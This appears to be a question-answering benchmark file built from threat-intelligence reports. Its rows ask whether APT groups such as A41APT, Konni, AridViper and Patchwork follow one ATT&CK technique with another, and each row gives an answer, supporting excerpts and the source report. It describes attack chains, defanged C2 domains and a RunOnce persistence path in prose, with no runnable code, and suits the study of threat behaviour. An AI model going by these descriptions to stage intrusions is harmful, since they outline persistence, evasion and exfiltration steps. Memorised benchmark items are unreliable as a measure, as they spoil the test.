Command and Control: Recorded Future observed over 10,000 unique C2 servers in 2021, with Cobalt Strike Team Servers and botnet families applying more resiliency and stealth measures. The most commonly observed C2 families were Cobalt Strike Team Servers, Meterpreter, Metasploit, QakBot, and TrickBot. The study also noted that 25% of detected servers were not referenced in open sources and were only identified on the Recorded Future Command and Control source. An average of a 35-day lead time was observed between when a C2 server is detected by scanning efforts and when it is reported in other sources.
Others: Recorded Future anticipates further insulation and modification of C2 servers in 2022 to avoid detection. TrickBot operators have hardened their infrastructure, and similar methods are expected to be employed by Cobalt Strike users. The C2 environment is expected to diversify, with new malware families and C2 frameworks likely to be aware of threat intelligence measures. Mitigations include using the Recorded Future Platform to identify actively exploited vulnerabilities, keeping systems and software up to date, implementing multi-factor authentication for remote access services, password-protecting sensitive files, and employing detection-in-depth methodologies.",Yes,2021 Adversary Infrastructure Report
2120,365,365-Discovery-T1518-Software Discovery,"After executing fileless implants via DLL side-loading using DESLoader, is it likely that the A41APT attackers will perform software discovery using WMIC before heavily utilizing RDP for lateral movement to target additional servers?","Discovery: The attackers conducted discovery activities post-compromise, including scanning for open RDP and SMB ports, using WMIC to collect information on security products, and deploying tools to discover domain accounts and trust relationships.","Initial Access: The A41APT campaign utilized SSL-VPN abuse to gain initial access to the target network, specifically targeting Japanese companies including their overseas branches. The attackers did not rely on spear-phishing but instead exploited SSL-VPN vulnerabilities or used stolen credentials to penetrate the network. The hostname 'DESKTOP-A41UVJV' was consistently used during these initial intrusions.
Execution: The attackers executed malicious code through the use of DESLoader, which is a multi-layer loader for various payloads including SodaMaster, P8RAT, and FYAntiLoader. DESLoader employed DLL side-loading techniques and fileless implants to execute its payloads. The payloads themselves, such as SodaMaster, were fileless RATs that executed commands and communicated with C2 servers.
Persistence: To maintain their foothold, the attackers registered scheduled tasks that executed legitimate executable files to load DESLoader every 15 minutes. The scheduled tasks were created with names that mimicked legitimate Windows tasks, making them harder to detect.
Defense Evasion: The A41APT campaign exhibited sophisticated defense evasion techniques, including the use of fileless implants, DLL side-loading, and the removal of event logs after C2 communication. The attackers also used obfuscated PowerShell commands to delete event logs, further covering their tracks.
Credential Access: The attackers performed internal network scanning to find open RDP and SMB ports after initial access via SSL-VPN. They used administrator accounts to deploy RDP to servers and executed tools like csvde.exe and AdFind to dump credentials from systems such as AD servers, file servers, and backup servers.
Lateral Movement: The A41APT campaign heavily utilized RDP for lateral movement within the network, mainly targeting servers. They used network scanning and credential theft to move laterally and gain access to additional systems.
Command and Control: The attackers communicated with C2 servers via DESLoader's payloads or PowerShell remoting. They favored the use of IP addresses over domains for C2 infrastructure and showed a tendency not to reuse IP addresses repeatedly.
Others: The A41APT campaign is attributed with strong associations to APT10 and potential relevance to BlackTech. The campaign targeted a wide range of industries and exhibited capabilities such as abusing DLL side-loading and removing traces post-compromise. The attackers used heavy IP address usage for C2 and avoided domain usage, with little reuse of IP addresses for C2. The IP used for initial intrusion and C2 were different. Countermeasures against this campaign include the implementation of MFA, patch adaptation operations, network monitoring, and strengthening security measures for servers.",Yes,greatidea_A41_v1.0
2122,365,365-Lateral Movement-T1021-Remote Services,"Is it likely that the A41APT campaign, after conducting discovery activities such as scanning for open RDP and SMB ports using WMIC and deploying tools to uncover domain accounts, will utilize RDP for lateral movement targeting servers within the network?","Lateral Movement: The A41APT campaign heavily utilized RDP for lateral movement within the network, mainly targeting servers. They used network scanning and credential theft to move laterally and gain access to additional systems.","Initial Access: The A41APT campaign utilized SSL-VPN abuse to gain initial access to the target network, specifically targeting Japanese companies including their overseas branches. The attackers did not rely on spear-phishing but instead exploited SSL-VPN vulnerabilities or used stolen credentials to penetrate the network. The hostname 'DESKTOP-A41UVJV' was consistently used during these initial intrusions.
Execution: The attackers executed malicious code through the use of DESLoader, which is a multi-layer loader for various payloads including SodaMaster, P8RAT, and FYAntiLoader. DESLoader employed DLL side-loading techniques and fileless implants to execute its payloads. The payloads themselves, such as SodaMaster, were fileless RATs that executed commands and communicated with C2 servers.
Persistence: To maintain their foothold, the attackers registered scheduled tasks that executed legitimate executable files to load DESLoader every 15 minutes. The scheduled tasks were created with names that mimicked legitimate Windows tasks, making them harder to detect.
Defense Evasion: The A41APT campaign exhibited sophisticated defense evasion techniques, including the use of fileless implants, DLL side-loading, and the removal of event logs after C2 communication. The attackers also used obfuscated PowerShell commands to delete event logs, further covering their tracks.
Credential Access: The attackers performed internal network scanning to find open RDP and SMB ports after initial access via SSL-VPN. They used administrator accounts to deploy RDP to servers and executed tools like csvde.exe and AdFind to dump credentials from systems such as AD servers, file servers, and backup servers.
Discovery: The attackers conducted discovery activities post-compromise, including scanning for open RDP and SMB ports, using WMIC to collect information on security products, and deploying tools to discover domain accounts and trust relationships.
Command and Control: The attackers communicated with C2 servers via DESLoader's payloads or PowerShell remoting. They favored the use of IP addresses over domains for C2 infrastructure and showed a tendency not to reuse IP addresses repeatedly.
Others: The A41APT campaign is attributed with strong associations to APT10 and potential relevance to BlackTech. The campaign targeted a wide range of industries and exhibited capabilities such as abusing DLL side-loading and removing traces post-compromise. The attackers used heavy IP address usage for C2 and avoided domain usage, with little reuse of IP addresses for C2. The IP used for initial intrusion and C2 were different. Countermeasures against this campaign include the implementation of MFA, patch adaptation operations, network monitoring, and strengthening security measures for servers.",Yes,greatidea_A41_v1.0
2123,365,365-Lateral Movement-T1550-Use Alternate Authentication Material,"After conducting discovery activities such as scanning for open RDP and SMB ports and using WMIC to collect information on security products, is it likely that the A41APT campaign will use credential theft for lateral movement within the network before communicating with C2 servers via DESLoader's payloads or PowerShell remoting?","Lateral Movement: The A41APT campaign heavily utilized RDP for lateral movement within the network, mainly targeting servers. They used network scanning and credential theft to move laterally and gain access to additional systems.","Initial Access: The A41APT campaign utilized SSL-VPN abuse to gain initial access to the target network, specifically targeting Japanese companies including their overseas branches. The attackers did not rely on spear-phishing but instead exploited SSL-VPN vulnerabilities or used stolen credentials to penetrate the network. The hostname 'DESKTOP-A41UVJV' was consistently used during these initial intrusions.
Execution: The attackers executed malicious code through the use of DESLoader, which is a multi-layer loader for various payloads including SodaMaster, P8RAT, and FYAntiLoader. DESLoader employed DLL side-loading techniques and fileless implants to execute its payloads. The payloads themselves, such as SodaMaster, were fileless RATs that executed commands and communicated with C2 servers.
Persistence: To maintain their foothold, the attackers registered scheduled tasks that executed legitimate executable files to load DESLoader every 15 minutes. The scheduled tasks were created with names that mimicked legitimate Windows tasks, making them harder to detect.
Defense Evasion: The A41APT campaign exhibited sophisticated defense evasion techniques, including the use of fileless implants, DLL side-loading, and the removal of event logs after C2 communication. The attackers also used obfuscated PowerShell commands to delete event logs, further covering their tracks.
Credential Access: The attackers performed internal network scanning to find open RDP and SMB ports after initial access via SSL-VPN. They used administrator accounts to deploy RDP to servers and executed tools like csvde.exe and AdFind to dump credentials from systems such as AD servers, file servers, and backup servers.
Discovery: The attackers conducted discovery activities post-compromise, including scanning for open RDP and SMB ports, using WMIC to collect information on security products, and deploying tools to discover domain accounts and trust relationships.
Command and Control: The attackers communicated with C2 servers via DESLoader's payloads or PowerShell remoting. They favored the use of IP addresses over domains for C2 infrastructure and showed a tendency not to reuse IP addresses repeatedly.
Others: The A41APT campaign is attributed with strong associations to APT10 and potential relevance to BlackTech. The campaign targeted a wide range of industries and exhibited capabilities such as abusing DLL side-loading and removing traces post-compromise. The attackers used heavy IP address usage for C2 and avoided domain usage, with little reuse of IP addresses for C2. The IP used for initial intrusion and C2 were different. Countermeasures against this campaign include the implementation of MFA, patch adaptation operations, network monitoring, and strengthening security measures for servers.",Yes,greatidea_A41_v1.0
2125,366,366-Execution-T1059-Command and Scripting Interpreter,"After the Konni APT Group gains initial access by delivering an ISO file downloaded from an in-the-wild URL and before achieving persistence through scheduling the 'install.vbs' script to run every 33 minutes via 'stopedge.bat', is it likely that various VBScripts and batch files such as 'install.vbs' will execute scripts including 'resolve.dns' and 'stopedge.bat' as part of their attack sequence?","Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2126,366,366-Execution-T1053-Scheduled Task/Job,"After gaining initial access via the download of an ISO file containing malicious scripts, is it likely that the Konni APT Group will execute deobfuscated batch and VBScript files such as 'stopedge.bat' to schedule 'install.vbs' before achieving persistence by ensuring 'install.vbs' runs every 33 minutes if 'paycom.ini' exists in the directory?","Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2128,366,366-Defense Evasion-T1070-Indicator Removal,"Is it likely that after the 'versioninfo.bat' script discovers system details and collects information for exfiltration, the 'stopedge.bat' script will manage the deletion of files such as 'versioninfo.bat' and 'update.vbs' to evade detection?","Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2130,366,366-Persistence-T1053-Scheduled Task/Job,"After 'stopedge.bat' manages the deletion of files such as 'versioninfo.bat' and 'update.vbs' as a means of defense evasion, is it likely that the script will contribute to persistence by scheduling the periodic execution of 'install.vbs'?",Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.,"Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2131,366,366-Discovery-T1083-File and Directory Discovery,"After the execution of various obfuscated scripts like 'update.vbs' and 'activate.vbs', is it likely that the Konni APT Group will use the 'versioninfo.bat' script to discover information about the user's computer before exfiltrating the collected data using 'unactivate.vbs'?","Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2132,366,366-Collection-T1074-Data Staged,"After discovering directory listings, IP addresses, running processes, and system details via 'versioninfo.bat', is it likely that the Konni APT Group will prepare the collected information for exfiltration as part of the data staging process before exfiltrating it to the C2 server using 'unactivate.vbs'?",Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.,"Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2133,366,366-Exfiltration-T1567-Exfiltration Over Web Service,"After collecting various information about the user's computer using 'versioninfo.bat', is the Konni APT Group likely to send this collected data through 'unactivate.vbs' before exfiltrating it via a POST request?","Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2134,367,367-Initial Access-T1566-Phishing,"After identifying the command and control (C2) domain judystevenson[.]info used by the initial malware, is it likely that further analysis will reveal additional associated malware samples that communicate with multiple C2 domains to support the operations of threat actor AridViper?","Initial Access: On November 27, 2020, a Twitter user @BaoshengbinCumt, associated with Qihoo, reported a malware hash faff57734fe08af63e90c0492b4a9a56, attributing it to the threat actor AridViper (APT-C-23 / GnatSpy). This malware was delivered via a malicious document disguised as a Curriculum Vitae, likely as part of a phishing campaign. The malware, once executed, made a POST request to the C2 domain judystevenson[.]info.","Command and Control: The initial malware sample communicated with the C2 domain judystevenson[.]info. Further analysis using the Augury Malware addon identified eight additional malware samples using the same C2. These samples also dropped a file named C:\ProgramData\GUID.bin, which was used as a pivot point to discover 18 more samples. Five additional C2 domains were identified: escanor[.]live, jaime-martinez[.]info, krasil-anthony[.]icu, nicoledotson[.]icu, and ruthgreenrtg[.]live. Pivoting on ImpHash values and the AV signature Win32/Revokery.J led to the discovery of five more associated samples and two more C2 domains: benyallen[.]club and chad-jessie[.]info. A user agent string resembling Googlebot was used as another pivot, identifying approximately 600 samples and four more samples with a distinctive URL pattern. This led to the identification of five more C2 domains: jack-fruit[.]club, lordblackwood[.]club, angeladeloney[.]info, overingtonray[.]info, and camilleoconnell[.]website. In total, 40 malware samples were identified, communicating with 13 C2 domains.
Others: Passive DNS data was obtained for the identified hostnames, revealing that most of them are associated with NAMECHEAP-NET in the US, except for camilleoconnell[.]website, which is associated with UCOM ARTERIA Networks Corporation in Japan. The use of NameCheap infrastructure has been previously observed in analyses of AridViper's activities.",Yes,Mapping out AridViper Infrastructure Using Augury’s Malware Module – Team Cymru
2135,367,367-Command and Control-T1071-Application Layer Protocol,"After gaining initial access via a phishing campaign delivering malware disguised as a Curriculum Vitae, is it likely that the initial malware sample will communicate with the C2 domain judystevenson[.]info before the malware samples proceed to use other identified C2 domains?","Command and Control: The initial malware sample communicated with the C2 domain judystevenson[.]info. Further analysis using the Augury Malware addon identified eight additional malware samples using the same C2. These samples also dropped a file named C:\ProgramData\GUID.bin, which was used as a pivot point to discover 18 more samples. Five additional C2 domains were identified: escanor[.]live, jaime-martinez[.]info, krasil-anthony[.]icu, nicoledotson[.]icu, and ruthgreenrtg[.]live. Pivoting on ImpHash values and the AV signature Win32/Revokery.J led to the discovery of five more associated samples and two more C2 domains: benyallen[.]club and chad-jessie[.]info. A user agent string resembling Googlebot was used as another pivot, identifying approximately 600 samples and four more samples with a distinctive URL pattern. This led to the identification of five more C2 domains: jack-fruit[.]club, lordblackwood[.]club, angeladeloney[.]info, overingtonray[.]info, and camilleoconnell[.]website. In total, 40 malware samples were identified, communicating with 13 C2 domains.","Initial Access: On November 27, 2020, a Twitter user @BaoshengbinCumt, associated with Qihoo, reported a malware hash faff57734fe08af63e90c0492b4a9a56, attributing it to the threat actor AridViper (APT-C-23 / GnatSpy). This malware was delivered via a malicious document disguised as a Curriculum Vitae, likely as part of a phishing campaign. The malware, once executed, made a POST request to the C2 domain judystevenson[.]info.
Others: Passive DNS data was obtained for the identified hostnames, revealing that most of them are associated with NAMECHEAP-NET in the US, except for camilleoconnell[.]website, which is associated with UCOM ARTERIA Networks Corporation in Japan. The use of NameCheap infrastructure has been previously observed in analyses of AridViper's activities.",Yes,Mapping out AridViper Infrastructure Using Augury’s Malware Module – Team Cymru
2138,368,368-Defense Evasion-T1027-Obfuscated Files or Information,"After targeting corporate employees on LinkedIn with fake job offers containing the Golden Chickens malware suite for gaining initial access, is it likely that badbullzvenom's Golden Chickens malware will evade detection by most antivirus companies through its stealthy design for defense evasion?","Defense Evasion: The Golden Chickens malware suite, developed by badbullzvenom, has been designed to be stealthy and evade detection by most antivirus companies. The malware is intended for use only in targeted attacks to maintain a low profile and avoid widespread detection.","Initial Access: The CTI report by eSentire's Threat Response Unit (TRU) identified a campaign where corporate employees on LinkedIn were targeted using fake job offers containing the Golden Chickens malware suite. In a subsequent campaign, corporate hiring managers received fake resumes laden with malware. These tactics reversed the attack vector, initially targeting employees and later targeting hiring managers.
Others: eSentire's Threat Response Unit (TRU) has been tracking the Golden Chickens malware suite, used by cybercrime groups FIN6, Cobalt Group, and Evilnum, which has caused financial losses over USD $1.5 billion. The report reveals the identity of the threat actor behind Golden Chickens, known as badbullzvenom, and his connection to the Cobalt Gang. TRU has uncovered extensive personal information about badbullzvenom, including his real name, address, and social media accounts. The report also details the progression of badbullzvenom from a script kiddie to a Malware-as-a-Service (MaaS) provider and the ongoing development and sale of the Golden Chickens malware suite. TRU continues to track new attack campaigns leveraging this malware and provides recommendations for organizations to protect against it.",Yes,Unmasking_VenomSpider_Report-Final
2143,369,369-Discovery-T1033-System Owner/User Discovery,"After achieving persistence by creating a RunOnce key in the registry, is it likely that the malware will perform discovery by obtaining the name of the user and identify the explorer process before establishing command and control through Process Hollowing for communication with the C2?",Discovery: The malware performs discovery by obtaining the name of the user and using the CreateToolhelp32snapshot function to identify the explorer process.,"Initial Access: The initial vector was identified as an INP file exploiting CVE-2017-12824. The file uses an ole stream to launch the first binary file, which then extracts a file to the temp folder and creates a thread for the second PE file.
Execution: The second PE file begins by checking the environment using the CheckRemoteDebuggerPresent function as an anti-forensic technique. It then creates persistence through a RunOnce key in the registry and uses the CreateToolhelp32snapshot function to get a snapshot of all processes, targeting the explorer process.
Persistence: Persistence is achieved by creating a RunOnce key in the registry (\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce Putty explorer.exe CurrentUserC:\file.exe).
Defense Evasion: The malware employs defense evasion by checking the environment using the CheckRemoteDebuggerPresent function and by using Process Hollowing to inject into a process for communication with the C2.
Command and Control: The malware establishes command and control by creating a process through Process Hollowing, which awaits further instructions from the C2. However, the C2 was down at the time of submission to VirusTotal, preventing further analysis.
Others: The malware sample is associated with APTPatchwork and is consistent with the Indian APT group Patchwork. The payload is linked to the Professional version of Inpage (2.21), commonly used in Pakistan. The C2 is hosted on Amazon CloudFront, and the payload is connected to recent events involving delegations from the Pakistan Naval and Air Force Academies visiting Azerbaijan.",Yes,Malware analysis about sample of APT Patchwork
2144,369,369-Discovery-T1057-Process Discovery,"After achieving persistence by creating a RunOnce key in the registry, is the malware likely to perform process discovery by identifying the explorer process before establishing command and control through Process Hollowing for communication with the C2?",Discovery: The malware performs discovery by obtaining the name of the user and using the CreateToolhelp32snapshot function to identify the explorer process.,"Initial Access: The initial vector was identified as an INP file exploiting CVE-2017-12824. The file uses an ole stream to launch the first binary file, which then extracts a file to the temp folder and creates a thread for the second PE file.
